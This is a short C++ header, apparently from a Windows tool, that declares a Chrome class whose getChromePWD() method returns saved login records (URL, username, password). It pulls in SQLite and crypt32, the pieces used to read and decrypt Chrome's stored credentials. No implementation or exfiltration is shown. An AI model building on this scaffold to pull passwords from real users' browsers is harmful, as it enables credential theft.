#ifndef CHROME_H
#define CHROME_H

#include <string>
#include <vector>
#include <windows.h>
#include <iostream>
#include <ShlObj.h>

EXTERN_C{
#include "sqlite3.h"
}

#pragma comment(lib,"crypt32")
typedef struct LoginInfo
{
	std::string Url = "";
	std::string Password = "";
	std::string UserName = "";
 };

class Chrome
{
public:
    Chrome(){}

	std::vector<LoginInfo>& getChromePWD();

private:
	std::vector<LoginInfo> logins;
	
};
#endif